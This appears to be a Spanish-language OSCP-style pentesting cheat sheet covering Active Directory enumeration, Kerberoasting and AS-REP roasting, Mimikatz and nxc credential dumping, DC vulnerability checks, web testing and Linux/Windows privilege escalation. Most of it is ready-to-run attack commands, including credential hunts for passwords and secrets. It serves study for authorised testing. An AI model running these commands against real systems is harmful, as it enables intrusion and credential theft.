[chuleta interesante](https://www.emmanuelsolis.com/oscp.html)
### 🔐 Active Directory (AD)

#### 🧭 Enumeración con acceso al dominio 
- PowerView
	```powershell
	# Dominio:
	Get-Domain | select -ExpandProperty name
	
	# Equipos + IPs para /etc/hosts:
	Get-DomainComputer | select -ExpandProperty name > equipos.txt
	foreach ($equipo in (Get-Content .\equipos.txt)) {$IP = Resolve-DnsName $equipo | select -ExpandProperty ipaddress; echo "$ip $equipo" } 
	
	# Usuarios del dominio:
	Get-DomainUser | select -ExpandProperty sAMAccountName
	
	# Recursos compartidos:
	foreach ($equipo in (Get-Content .\equipos.txt)) {net view \\$equipo}
	```
- `ldapsearch`
	```bash
	ldapsearch -x -H ldap://dc01 -b "dc=domain,dc=com"
	# o para búsqueda de información sensible
	ldapsearch -x -H ldap://dc01 -b "dc=example,dc=local" '(objectClass=*)' | grep -iE 'pass|pwd|description|comment|info'
	# ejemplo proporcionando credenciales y buscando usuarios con logon script -> buscar scritps que se ejecutan al iniciar sesión
	ldapsearch -h $target -D "CN=user,DC=domain,DC=local" -w 'password' -b "DC=domain,DC=local" "(scriptPath=*)" sAMAccountName scriptPath
	```
- `windapsearch` - menos técnico 
	```bash
	# se podría omitir usuario y contraseña si no se tiene info
	python windapsearch.py -d $domain --dc-ip $target -u $username -p $password
	
	```
#### 🦆 [[Miscelaneo#ASREPRoasting| ASReproasting]] 
- Buscar cuentas sin preautenticación Kerberos (con credenciales de usuario)
	```bash
	impacket-GetNPUsers -dc-ip $dcip -request -outputfile hash_asreproast $domain/$username:$password
	```
- Obtenemos hash `Kerberos AS-REP (etype 23)`.  Craqueamos con:
	```bash
	hashcat -m 18200 hash_asreproast /usr/share/wordlists/rockyou.txt 
	```
#### 🔥 [[Kerberoasting]]
- Enumerar SPN.
	```bash
	impacket-GetUserSPNs -dc-ip $dcip $domain/$username:$password
	```
- Solicitar todos los tickets (obviar `krbtgt`)
	```bash
	impacket-GetUserSPNs -dc-ip $dcip $domain/$username -request -outputfile hash_kerberoast
	```
- Obtener hash `Kerberos TGS-REP (etype 23)`. Craqueamos:
	```
	hashcat -m 13100 hash_kerberoast /usr/share/wordlists/rockyou.txt
	```

#### 💀 Null Sessions SMB
```bash
smbclient -N -L \\$target
```
#### 🚪 Puertos internos ocultos
```bash
netstat.exe -ano
```
#### ⬆️ [[#🪟 Escalada de privilegios en Windows]]

#### 🧪 Mimikatz
```powershell
# SAM (usuarios locales + hashes)
.\mimikatz.exe privilege::debug lsadump::sam exit > dumpSAM.txt

# LSASS (credenciales en memoria: texto plano, NTLM, etc.)
.\mimikatz.exe privilege::debug sekurlsa::logonpasswords exit > dumpLSASS.txt

# Secrets (LSA secrets + DPAPI keys + secretos de servicios)
.\mimikatz.exe privilege::debug lsadump::lsa /patch exit > secrets_lsa.txt

# Ekeys (claves de cifrado para Pass-The-Key / DPAPI)
.\mimikatz.exe privilege::debug sekurlsa::ekeys exit > ekeys.txt

# Cache (credenciales de dominio en caché, útiles sin conexión al DC - hay que craquear con hascat -m 2100)
.\mimikatz.exe privilege::debug lsadump::cache exit > cache.txt

# Tickets (Kerberos TGT/TGS para PTT, silver/golden ticket)
.\mimikatz.exe privilege::debug sekurlsa::tickets /export exit
```
#### nxc
A veces puede dar información que no da mimikatz
```bash
# SAM
nxc smb $target -u Administrator -H $(cat hashAdmin_gyoza) --sam --local-auth
# LSASS
nxc smb $target -u Administrator -H $(cat hashAdmin_gyoza) -M nanodump --local-auth
# Secrets y más info
nxc smb $target -u Administrator -H $(cat hashAdmin_gyoza) --lsa --local-auth
```
#### 🗝️ Uso de credenciales
- PTH, PTT, Pass-the-key, credenciales en texto plano.
- Intentar acceso vía:
    - RDP
    - WinRM
    - impacket-wmiexec
    - impacket-psexec
    - con `--local-auth` si procede
    - Utilizar usuarios como contraseñas
#### 📈 BloodHound
- Recolectar con `SharpHound`.
- Analizar relaciones para escalada o movimiento lateral.
#### Vulnerabilidades DC
- Comprobar vulnerabilidades clásicas del DC
	```bash
	# Zerologon
	nxc smb $target -u $username -p $password -M zerologon
	# Petit-potam -> Ojo! MITM
	nxc smb $target -u $username -p $password  -M petitpotam 
	# Nopac
	nxc smb $target -u $username -p $password  -M nopac
	```
#### 🔁 Repetir
- Cada vez que encontremos un nuevo usuario repetir procesos de enumeración, como mostrar el historial del usuario, carpetas en las que pueda haber información sensible sobre otros usuarios, volver a lanzar winpeas...
---

### 🌐 Pentesting Web 
#### 🔍 Reconocimiento
- `whatweb`, Wappalyzer
- Buscar info en:
    - `/robots.txt`
    - `/sitemap.xml`
    - comentarios HTML, JavaScript expuesto
    - `curl -I`
    - Buscar `Powered by` para versión / buscar info en mouseover en la pestaña de la página
    - Buscar comentarios `<!--`

#### 🗝️ Credenciales por defecto
- Revisar en: [https://github.com/ihebski/DefaultCreds-cheat-sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet)
#### 🕸 CMS
Si estamos ante un CMS, debemos preocuparnos por encontrar la siguiente información (normalmente será muy complicado encontrar vulnerabilidades en la propia aplicación)
- Vulnerabilidades en el propio CMS
- Vulnerabilidades en plugins, themes
- Búsqueda de `usernames`
- Buscar el `github` del propio CMS para encontrar información
	- `.htacces` ó `web.config`para ver que archivos se permiten mostrar y cuales no
#### 📂 Fuzzing
- Directorios con `ffuf`, `gobuster`, `feroxbuster`
- VHOSTS vía cabeceras `Host:` o DNS bruteforce

#### 💉 Inyecciones
- Inyectar en campos GET/POST: `SQLi`, `XSS`, `CMDi`
- Cambiar parámetros manualmente
#### 📂 Path Traversal
- Revisar: [https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- Usar listas como: `deep_traversal.txt`

#### 📜 LFI/RFI
- Probar rutas como:
    - `/etc/passwd`
    - archivos de logs
    - php wrappers (`php://filter`)

---

### 🐧 Escalada de privilegios en Linux
#### 🔍 Comprobaciones manuales
```bash
# Archivos sensibles:
ls -l /etc/passwd /etc/shadow /etc/sudoers

# Sudo sin contraseña:
sudo -l

# Comprobaciones básicas
id

# credenciales por defecto
su root

# Binarios SUID/GUID: 
python3 suid3num.py # funciona con python 2
find / -perm -4000 -type f 2>/dev/null   # SUID
find / -perm -2000 -type f 2>/dev/null   # GUID

# Capabilities:
getcap -r / 2>/dev/null

# Grupos:
groups

# Versión de sudo:
sudo -V | head -n 1

# Variables de entorno:
env

# Probar snmpwalk 
snmpwalk -v2c -c public $target NET-SNMP-EXTEND-MIB::nsExtendObjects
snmpwalk -v2c -c public $target | grep -iE 'pass|pwd|key|user|cred|secret'
# snmp-check
snmp-check $target -c public
```
#### 🛠️ Automatización
- `linpeas.sh`
- `pspy64` o `pspy32` para detectar cronjobs y scripts ejecutados

#### 📁 Búsqueda de archivos sospechosos

```bash
# Archivos no vacíos
find . -type f -size +0c
# Backups, archivos ocultos y nombres sospechosos:
find / -type f \( -iname "*.old" -o -iname "*.bak" -o -iname "*.backup" -o -iname "*copy*" -o -iname "*backup*" -o -iname "*config*" -o -iname "*save*" -o -iname "*temp*" -o -iname "*dump*" -o -iname "*test*" -o -iname "*.zip" -o -iname "*.tar" -o -iname "*.gz" -o -iname ".*.swp" -o -iname ".*.git" \) 2>/dev/null

# Buscar carpetas con nombres sospechosos:
find / -type d \( -iname "*backup*" -o -iname "*old*" -o -iname "*copy*" -o -iname "*temp*" -o -iname "*save*" \) 2>/dev/null

# Archivos con credenciales:
grep -ri "password\|passwd\|secret\|token\|key" /home/* 2>/dev/null

# Buscar permisos de escritura globales:
find / -writable -type f 2>/dev/null

# Buscar usuarios en archivos de logs 
grep -Fi -f usernames.txt infoLogs
```
#### 📂 Carpetas útiles para chequear manualmente en **Linux** (escalada de privilegios)
```bash
# Búsqueda de archivos no vacíos dentro de carpetas útiles
find /opt /srv /var/backups /var/www/html /mnt /media /home -type f -size +0c 2>/dev/null
# Búsqueda de archivos sospechosos dentro de carpetas útiles
find /opt /srv /var/backups /var/www/html /mnt /media /home -type f \( -iname "*.zip" -o -iname "*.bak" -o -iname "*backup*" -o -iname "*.old" -o -iname "*.log" \) 2>/dev/null
# Búsqueda de más archivos
find /opt /srv /var/backups /var/www/html /mnt /media /home -type f \( \
    -iname "*.old" -o -iname "*.bak" -o -iname "*.backup" -o -iname "*copy*" \
    -o -iname "*backup*" -o -iname "*config*" -o -iname "*save*" -o -iname "*temp*" \
    -o -iname "*dump*" -o -iname "*test*" -o -iname "*.zip" -o -iname "*.tar" \
    -o -iname "*.gz" -o -iname "*.log" -o -iname "*.kdbx" -o -iname "*keepass*" \
    \) ! -empty 2>/dev/null
# Contenido sensible en estos archivos
grep -rEi "password|secret|token|key|creds" /opt /srv /var/backups /var/www/html /mnt /media /home 2>/dev/null
```

| Carpeta                | Qué buscar                                                                                        |
| ---------------------- | ------------------------------------------------------------------------------------------------- |
| `/home/*`              | Archivos `.bash_history`, `.ssh`, credenciales, scripts personalizados                            |
| `/root` (si accesible) | Archivos de configuración root, credenciales, scripts de mantenimiento                            |
| `/opt/`                | Software de terceros instalado manualmente. Muchas veces con scripts o binarios mal configurados. |
| `/srv/`                | Servidores (web, FTP, etc.) pueden tener backups, datos sensibles.                                |
| `/var/backups/`        | Backups automáticos del sistema. A veces incluye `/etc/shadow` o `.gz`                            |
| `/var/www/html`        | Archivos web. PHPs mal escritos, backups (`.old`, `.zip`, `.bak`, etc.)                           |
| `/etc/cron.*`          | Cronjobs con scripts modificables, tareas automáticas                                             |
| `/tmp/` y `/dev/shm/`  | Archivos temporales, sockets, volcados en texto plano                                             |
| `/run/`, `/var/run/`   | Sockets, procesos activos, demonios mal configurados                                              |
| `/mnt/` y `/media/`    | Discos montados, a veces puntos de respaldo o unidades USB con secretos                           |
| `/usr/local/bin/`      | Binarios personalizados (propensos a errores de permisos)                                         |
| `/etc/`                | Archivos de configuración, contraseñas duras, secretos en texto plano                             |
| `/xampp/` o `/lampp/`  | Entornos LAMP con configuraciones inseguras y paneles accesibles sin contraseña                   |


### 🪟 Escalada de privilegios en Windows
```
whoami /priv
```
#### 🔑 Privilegios explotables

- **`SeImpersonatePrivilege`**: permite ejecutar ataques como Juicy Potato, PrintSpoofer.
- **`SeDebugPrivilege`**: acceso a procesos ajenos, como LSASS.
- **`SeTakeOwnershipPrivilege`**: puedes adueñarte de objetos protegidos.
- **`SeRestorePrivilege` / `SeBackupPrivilege`**: lectura de archivos normalmente inaccesibles.
- **`SeChangeNotifyPrivilege`**: Permite activar otros privilegios

#### 👥 Grupos integrados de Windows
- Búsqueda de grupos intersantes
	```powershell
	whoami /groups | findstr /i "Backup Operators Event Log Readers DnsAdmins Print Operators Server Operators"
	# o una búsqueda más afinada
	$targetGroups = @(
	  "BUILTIN\Backup Operators",
	  "BUILTIN\Event Log Readers",
	  "BUILTIN\DnsAdmins",
	  "BUILTIN\Print Operators",
	  "BUILTIN\Server Operators"
	)
	
	$groups = [System.Security.Principal.WindowsIdentity]::GetCurrent().Groups |
	    ForEach-Object { $_.Translate([System.Security.Principal.NTAccount]) }
	
	foreach ($group in $groups) { if ($targetGroups -contains $group.Value) { Write-Output "Perteneces a: $($group.Value)" }}
	```
	- **Administrators**: acceso total.
	- **Backup Operators**: lectura y backup de archivos, incluso protegidos.
	- **Event Log Readers**: acceso a logs con info sensible.
	- **DNS Admins**: potencial RCE en servidores DNS.
	- **Print/Server Operators**: tareas administrativas con potencial de abuso.
	- Variables de entorno
	```
	Get-ChildItem Env:
	```
- Historial
	```powershell
	# Esto solo muestra el path
	(Get-PSReadlineOption).HistorySavePath
	```

#### ⚙️ Permisos débiles

Detectables con herramientas como PowerUp, WinPEAS o manualmente:
- Servicios modificables (`Modifiable Services`, `Modifiable Binaries`).
- `Unquoted Service Paths`: rutas de ejecutables sin comillas.
- Permisos en claves de ejecución automática (`Startup`, `Run`).

#### 🐚 Herramientas útiles
- `WinPEAS`: escaneo extenso del sistema Windows.
- `Seatbelt`: recolección de info sensible/local.
- `PowerUp`: detección de vectores típicos de privesc.
- `Snaffler`: búsqueda de archivos jugosos en red o disco.
- `Watch-command`: Permite monitorear procesos y servicios
-  `Invoke-EventViewer`: Bypass UAC

#### 🐞 Kernel exploits (TODO)
- Identifica rversión del sistema (`systeminfo`) y compara con exploits conocidos (e.g., MS16-032).
- Usar `windows-exploit-suggester` para sugerencias automáticas.

#### 🔥 Servicios vulnerables y tareas programadas
- Servicios con ejecución como SYSTEM desde rutas editables.
- Tareas con binarios modificables o sin permisos controlados (`schtasks /query /fo LIST /v`).
#### 🪟 Archivos sospechosos

```powershell
# Utilizar ... en lugar de dir, para mostrar ocultos y propietario del archivo
dir /a /o /q 
# Buscar archivos no vacíos
Get-ChildItem -File -Recurse | Where-Object { $_.Length -gt 0 }

# Guardar el contenido de todos los archivos no vacíos en un mismo lugar (útil si son todo archivos de texto)
Get-ChildItem -File -Recurse | Where-Object { $_.Length -gt 0 } | ForEach-Object { Add-Content -Path "C:\Users\Public\salida.txt" -Value ("`n--- $($_.FullName) ---`n"); Get-Content $_.FullName | Add-Content -Path "C:\Users\Public\salida.txt" }

# Buscar archivos con nombres sugerentes (añadir -File si queremos solo archivos , y quitar el where-object si no queremos):
Get-ChildItem -Path C:\ -Recurse -Include *.bak,*.old,*.zip,*.rar,*.7z,*.tar,*.gz,*backup*,*copy*,*temp*,*save*,*config*,*test* -ErrorAction SilentlyContinue -Force | Where-Object { $_.FullName -notmatch '^C:\\Windows' -and $_.FullName -notmatch '^C:\\Program Files' -and $_.FullName -notmatch '^C:\\Program Files \(x86\)' }

# Buscar carpetas con nombres sospechosos:
Get-ChildItem -Path C:\ -Recurse -Directory -Include *backup*,*old*,*copy*,*temp*,*save* -ErrorAction SilentlyContinue -Force


# Buscar archivos dentro de esas carpetas y buscar patrones sensibles (darle nombre $dir a la búsqueda que queramos yu buscar)
foreach ($dir in $dirs) { Get-ChildItem -Path $dir.FullName -Recurse -File -ErrorAction SilentlyContinue | Select-String -Pattern "password|passwd|secret|credentials|key" -CaseSensitive:$false -ErrorAction SilentlyContinue | Select-Object Path, LineNumber, Line }


# Buscar archivos de configuración expuestos:
Get-ChildItem -Path C:\ -Recurse -Include *.config,*.ini,*.xml -ErrorAction SilentlyContinue -Force

# Buscar usuarios en archivos de logs - >linux
grep -Fi -f usernames.txt infoLogs
# o windows -quitar set-content si solo queremos ver por pnatalla
Select-String -Path "infoLogs.txt" -Pattern (Get-Content usernames.txt) -SimpleMatch | Set-Content coincidencias.txt
```
#### 📂 Carpetas útiles para chequear manualmente en **Windows** (escalada de privilegios)

```powershell
# Búsqueda de archivos no vacíos dentro de carpetas útiles
Get-ChildItem -Path "C:\Users\*", "C:\Scripts", "C:\Backups", "C:\Temp", "C:\ProgramData", "C:\inetpub\wwwroot" -Recurse -File -ErrorAction SilentlyContinue | Where-Object { $_.Length -gt 0 }
# Búsqueda de archivos sospechosos dentro de carpetas útiles
Get-ChildItem -Path "C:\Users\*", "C:\Scripts", "C:\Backups", "C:\Temp", "C:\ProgramData", "C:\inetpub\wwwroot" -Recurse -File -ErrorAction SilentlyContinue | Where-Object {
    $_.Name -match '\.bak$|\.old$|\.zip$|\.log$|\.kdbx$|keepass|backup|copy|cred|password'
}
# Búsqueda de información sensible dentro de estos archivos
(Get-ChildItem -Path "C:\Users\*", "C:\Scripts", "C:\Backups", "C:\Temp", "C:\ProgramData", "C:\inetpub\wwwroot" -Recurse -File -ErrorAction SilentlyContinue | Where-Object { $_.Length -gt 0 }) | Select-String -Pattern "password|secret|token|key|creds" -SimpleMatch | Select-Object Path, LineNumber, Line
```

| Carpeta                                    | Qué buscar                                                                |
| ------------------------------------------ | ------------------------------------------------------------------------- |
| `C:\Users\*\Desktop`                       | Notas, scripts de admins, contraseñas en texto plano                      |
| `C:\Users\*\Documents`                     | PDFs, DOCX, credenciales, backups                                         |
| `C:\Users\*\Downloads`                     | Instaladores, herramientas usadas por el usuario                          |
| `C:\Users\*\AppData\Local\Temp`            | Temporales con volcados o archivos sensibles                              |
| `C:\Program Files` / `Program Files (x86)` | Software mal configurado, rutas modificables, binarios inseguros          |
| `C:\ProgramData`                           | Configuraciones globales, archivos compartidos                            |
| `C:\Temp`                                  | Archivos temporales personalizados, muy común en entornos dev             |
| `C:\inetpub\wwwroot`                       | Código fuente de aplicaciones web, bases de datos, credenciales hardcoded |
| `C:\Windows\Tasks` / `System32\Tasks`      | Tareas programadas, ejecución automática como SYSTEM                      |
| `C:\Backups`, `C:\Scripts`                 | Carpeta común para volcados de seguridad y automatizaciones               |
| `C:\Recycle.Bin` o Papelera                | Archivos borrados que pueden contener datos útiles                        |
| Carpetas compartidas (`\\`)                | Información accesible vía SMB; usar `net view`, `net use`, `SharpHound`   |